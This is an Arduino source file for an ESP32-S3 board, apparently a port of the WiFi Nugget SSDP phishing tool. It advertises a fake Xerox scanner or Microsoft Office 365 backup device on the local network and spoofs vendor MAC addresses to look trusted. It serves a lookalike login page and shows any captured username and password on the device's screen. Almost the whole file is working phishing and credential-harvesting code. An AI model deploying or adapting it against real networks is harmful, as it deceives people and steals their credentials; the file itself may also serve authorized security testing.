/* WiFi Nugget SSDP Phishing, 2022
 * https://github.com/HakCat-Tech/Nugget-SSDP
 *
 * by Alex Lynd & HakCat Hardware
 * https://hakcat.com

Modified to work on the LiLyGO T-Display-S3 a ESP32-S3 development board with display.

 */

#include <Arduino.h>
// include libraries
#include <ESPAsyncWebServer.h>
#include "ESP32SSDP.h"
#include "TFT_eSPI.h" /* Please use the TFT library provided in the lib folder. */
#include "SPIFFS.h"
#include <esp_wifi.h>

// Pins definition T-Display-S3
#include "pin_config.h"
// WiFi credentials, rename credentials.h.example to credentials.h and fill in your WiFi credentials
#include "credentials.h"

/**
 * @brief The hostname of the device.
 */
String hostname = "scanner";

// start web server
/**
 * @brief The web_server object used to handle incoming HTTP requests.
 */
AsyncWebServer web_server(80);
extern String index_html;

#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 0, 0)
#error "The current version is not supported for the time being, please use a version below Arduino ESP32 3.0"
#endif

/* The product now has two screens, and the initialization code needs a small change in the new version.
   The LCD_MODULE_CMD_1 is used to define the switch macro. */
// #define LCD_MODULE_CMD_1

TFT_eSPI tft = TFT_eSPI();

int x = 1;
int y = 1;
int width = 318;
int height = 168;
int radius = 10;

#if defined(LCD_MODULE_CMD_1)
typedef struct
{
    uint8_t cmd;
    uint8_t data[14];
    uint8_t len;
} lcd_cmd_t;

lcd_cmd_t lcd_st7789v[] = {
    {0x11, {0}, 0 | 0x80},
    {0x3A, {0X05}, 1},
    {0xB2, {0X0B, 0X0B, 0X00, 0X33, 0X33}, 5},
    {0xB7, {0X75}, 1},
    {0xBB, {0X28}, 1},
    {0xC0, {0X2C}, 1},
    {0xC2, {0X01}, 1},
    {0xC3, {0X1F}, 1},
    {0xC6, {0X13}, 1},
    {0xD0, {0XA7}, 1},
    {0xD0, {0XA4, 0XA1}, 2},
    {0xD6, {0XA1}, 1},
    {0xE0, {0XF0, 0X05, 0X0A, 0X06, 0X06, 0X03, 0X2B, 0X32, 0X43, 0X36, 0X11, 0X10, 0X2B, 0X32}, 14},
    {0xE1, {0XF0, 0X08, 0X0C, 0X0B, 0X09, 0X24, 0X2B, 0X22, 0X43, 0X38, 0X15, 0X16, 0X2F, 0X37}, 14},
};
#endif

/**
 * @brief Exposes the SSDP service.
 */
void exposeSSDP()
{
    // set schema xml url, need to match http handler
    //"ssdp/schema.xml" if not set
    SSDP.setSchemaURL("ssdp/device.xml");
    // set port
    // 80 if not set
    SSDP.setHTTPPort(80);
    // set device name
    // Null string if not set
    SSDP.setName(hostname == "scanner" ? "Corporate Scanner [3 NEW SCANS WAITING]" : "Office 365 Backups");
    // set Serial Number
    // Null string if not set
    SSDP.setSerialNumber("001788102201");
    // set device url
    // Null string if not set
    SSDP.setURL("http://" + WiFi.localIP().toString() + "/present.html");
    // set model name
    // Null string if not set
    SSDP.setModelName(hostname == "scanner" ? "Multifunction printer VersaLink C505 / X" : "Office 365 Advance Backups Online");
    // set model description
    // Null string if not set
    SSDP.setModelDescription(hostname == "scanner" ? "Confidential document scanner" : "Secure Storage for Office 365");
    // set model number
    // Null string if not set
    SSDP.setModelNumber("929000226503");
    // set model url
    // Null string if not set
    // SSDP.setModelURL("");
    // set model manufacturer name
    // Null string if not set
    SSDP.setManufacturer(hostname == "scanner" ? "Xerox" : "Microsoft Corporation");
    // set model manufacturer url
    // Null string if not set
    SSDP.setManufacturerURL(hostname == "scanner" ? "http://www.xerox.com" : "http://www.microsoft.com");
    // set device type
    //"urn:schemas-upnp-org:device:Basic:1" if not set
    SSDP.setDeviceType(hostname == "scanner" ? "urn:schemas-upnp-org:device:Scanner:1" : "urn:schemas-upnp-org:device:Basic:1"); // to appear as root device, other examples: MediaRenderer, MediaServer ...
    // set server name
    //"Arduino/1.0" if not set
    SSDP.setServerName("SSDPServer/1.0");
    // set UUID, you can use https://www.uuidgenerator.net/
    // use 38323636-4558-4dda-9188-cda0e6 + 4 last bytes of mac address if not set
    // use SSDP.setUUID("daa26fa3-d2d4-4072-bc7a-a1b88ab4234a", false); for full UUID
    // SSDP.setUUID("daa26fa3-d2d4-4072-bc7a");
    SSDP.setUUID("0fd154be-1e69-48c6-9fa3-c9971212b358", false);
    // Set icons list, NB: optional, this is ignored under windows
    SSDP.setIcons(("<icon><mimetype>image/png</mimetype><height>48</height><width>48</width><depth>24</depth><url>http://" + WiFi.localIP().toString() + "/icon48.png</url></icon>").c_str());
    // Set service list, NB: optional for simple device
    if (hostname == "scanner")
    {
        SSDP.setServices("<service>"
                         "<serviceType>urn:schemas-upnp-org:device:ScannerBasic:1</serviceType>"
                         "<serviceId>urn:schemas-upnp-org:device:ScannerBasic</serviceId>"
                         "<controlURL>/ssdp/service-desc.xml</controlURL>"
                         "<eventSubURL>/ssdp/service-desc.xml</eventSubURL>"
                         "<SCPDURL>/ssdp/service-desc.xml</SCPDURL>"
                         "</service>");
    }
    else
    {
        SSDP.setServices("<service>"
                         "<serviceType>urn:schemas-upnp-org:device:Basic:1</serviceType>"
                         "<serviceId>urn:schemas-upnp-org:device:Basic</serviceId>"
                         "<controlURL>/ssdp/service-desc.xml</controlURL>"
                         "<eventSubURL>/ssdp/service-desc.xml</eventSubURL>"
                         "<SCPDURL>/ssdp/service-desc.xml</SCPDURL>"
                         "</service>");
    }
}

void serveWebPages()
{
    /********** Home page **********/
    web_server.on("/", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("Redirecting to /present.html");
                      request->redirect("/present.html");
                      Serial.println(" done");
                      // done
                  });
    /********** Phishing page **********/
    web_server.on("/present.html", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("Received request from client");
                      request->send(SPIFFS, "/" + hostname + "/present.html", "text/html");
                      tft.fillScreen(TFT_BLACK);
                      tft.drawRoundRect(x, y, width, height, radius, TFT_ORANGE);
                      tft.setTextColor(TFT_BLACK, TFT_ORANGE);
                      tft.drawString(" Honeypot just open ", 16, 4, 2);

                      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
                      tft.drawString("Remote:", 16, 48, 2);
                      tft.setTextColor(TFT_GREEN, TFT_BLACK);
                      tft.drawString(request->client()->remoteIP().toString(), 120, 48, 2);

                      Serial.println(" done");
                      // done
                  });
    /********** Perform login and redirect Page **********/
    web_server.on("/login.php", HTTP_POST, [&](AsyncWebServerRequest *request)
                  {
                      Serial.println("Ha good new acquisition ! ");
                      String username = request->getParam("username", true)->value();
                      String password = request->getParam("password", true)->value();

                      tft.fillScreen(TFT_BLACK);
                      tft.drawRoundRect(x, y, width, height, radius, TFT_RED);
                      tft.setTextColor(TFT_BLACK, TFT_RED);
                      tft.drawString(" Honeypot tasted !!! ", 16, 4, 2);

                      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
                      tft.drawString("Username:", 16, 34, 2);
                      tft.setTextColor(TFT_GREEN, TFT_BLACK);
                      tft.drawString(username, 16, 60, 2);

                      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
                      tft.drawString("Password:", 16, 92, 2);
                      tft.setTextColor(TFT_GREEN, TFT_BLACK);
                      tft.drawString(password, 16, 118, 2);

                      Serial.print("Redirecting to somewhere else...");
                      request->redirect("/error.html");
                      Serial.println(" done");
                      // done
                  });
    /********** Error page **********/
    web_server.on("/error.html", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("Mimicking device in error");
                      request->send(SPIFFS, "/error.html", "text/html");
                      Serial.println(" done");
                      // done
                  });
    /********** SSDP Description **********/
    web_server.on("/ssdp/device.xml", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("send /ssdp/device.xml");
                      request->send(200, "text/xml", SSDP.getSchema());
                      Serial.println(" done");
                      // done
                  });
    /********** SSDP Service Description **********/
    web_server.on("/ssdp/service-desc.xml", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("send /ssdp/service-desc.xml");
                      request->send(SPIFFS, "/service-desc.xml", "text/xml");
                      Serial.println(" done");
                      // done
                  });
    /********** SSDP Icon **********/
    web_server.on("/icon48.png", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("send /icon48.png");
                      request->send(SPIFFS, "/" + hostname + "/icon48.png", "image/png");
                      Serial.println(" done");
                      // done
                  });
    /********** SSDP Error Icon **********/
    web_server.on("/error_icon.png", HTTP_GET, [&](AsyncWebServerRequest *request)
                  {
                      Serial.print("send /error_icon.png");
                      request->send(SPIFFS, "/error_icon.png", "image/png");
                      Serial.println(" done");
                      // done
                  });
    /********** CSS **********/
    web_server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request)
                  {
                      Serial.print("send /style.css");
                      request->send(SPIFFS, "/" + hostname + "/style.css", "text/css");
                      Serial.println(" done");
                      // done
                  });
    /********** Favicon **********/
    web_server.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request)
                  {
                      Serial.print("send /favicon.ico");
                      request->send(SPIFFS, "/favicon.ico", "image/x-icon");
                      Serial.println(" done");
                      // done
                  });
    /********** 404 **********/
    web_server.onNotFound([](AsyncWebServerRequest *request)
                          {
                              Serial.print("send 404");
                              request->send(SPIFFS, "/404.html", "text/html");
                              Serial.println(" done");
                              // done
                          });
}

/**
 * @brief Function to initialize the ESP32 device.
 *
 * This function is called once when the device starts up. It is used to initialize
 * any necessary settings or configurations for the device.
 */
void setup()
{
    pinMode(PIN_POWER_ON, OUTPUT);
    digitalWrite(PIN_POWER_ON, HIGH);

    Serial.begin(115200);

    Serial.print("WiFi SSDP Phishing for ");
    pinMode(PIN_BUTTON_2, INPUT_PULLUP);
    if (digitalRead(PIN_BUTTON_2) == LOW)
    {
        hostname = "backup";
        Serial.print("Microsoft Office 365 Backups");
    }
    else
    {
        hostname = "scanner";
        Serial.print("Corporate Scanner");
    }
    Serial.println(" starting...");

    tft.begin();

#if defined(LCD_MODULE_CMD_1)
    for (uint8_t i = 0; i < (sizeof(lcd_st7789v) / sizeof(lcd_cmd_t)); i++)
    {
        tft.writecommand(lcd_st7789v[i].cmd);
        for (int j = 0; j < (lcd_st7789v[i].len & 0x7f); j++)
        {
            tft.writedata(lcd_st7789v[i].data[j]);
        }

        if (lcd_st7789v[i].len & 0x80)
        {
            delay(120);
        }
    }
#endif

    tft.setRotation(3);
    tft.setSwapBytes(true);

#if ESP_IDF_VERSION < ESP_IDF_VERSION_VAL(5, 0, 0)
    ledcSetup(0, 2000, 8);
    ledcAttachPin(PIN_LCD_BL, 0);
    ledcWrite(0, 255);
#else
    ledcAttach(PIN_LCD_BL, 200, 8);
    ledcWrite(PIN_LCD_BL, 255);
#endif

    if (!SPIFFS.begin(true))
    {
        Serial.println("An Error has occurred while mounting SPIFFS");
        return;
    }

    tft.fillScreen(TFT_BLACK);
    /*
    screen size 170*320
    */

    tft.drawRoundRect(x, y, width, height, radius, TFT_BLUE);
    tft.setTextSize(2);
    tft.setTextColor(TFT_BLACK, TFT_GREEN);

    tft.drawString(" " + hostname + " SSDP Phishing ", 16, 4, 2);

    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("IP:", 16, 34, 2);
    // start WiFi!
    WiFi.mode(WIFI_STA);
    // use a Xerox MAC address
    uint8_t xerox_MAC_address[] = {0x9C, 0x10, 0x4A, 0xB9, 0xE2, 0xF5};
    // use a Microsoft MAC address
    uint8_t microsoft_MAC_address[] = {0x0C, 0x35, 0x26, 0xB9, 0xE2, 0xF5};
    esp_wifi_set_mac(WIFI_IF_STA, hostname == "scanner" ? xerox_MAC_address : microsoft_MAC_address);
    WiFi.begin(ssid, passphrase);
    tft.setCursor(52, 48);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    while (WiFi.status() != WL_CONNECTED)
    {
        delay(500);
        tft.print(".");
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(WiFi.localIP().toString(), 52, 34, 2);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    // set custom hostname and start web server links
    WiFi.setHostname(hostname.c_str());
    if (WiFi.waitForConnectResult() == WL_CONNECTED)
    {
        tft.drawString("Starting HTTP...", 16, 60, 2);
        serveWebPages();
        web_server.begin();

        tft.drawString("Starting SSDP...", 16, 86, 2);
        exposeSSDP();
        SSDP.begin();

        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.drawString("Ready!", 16, 128, 2);
    }
    else
    {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.drawString("WiFi Failed", 16, 60, 2);
        while (1)
        {
            delay(100);
        }
    }
}

/**
 * @brief The main loop of the program.
 *
 * This function is called repeatedly in the program's execution. It is responsible for
 * executing the main logic of the program.
 */
void loop()
{
    delay(1);
}
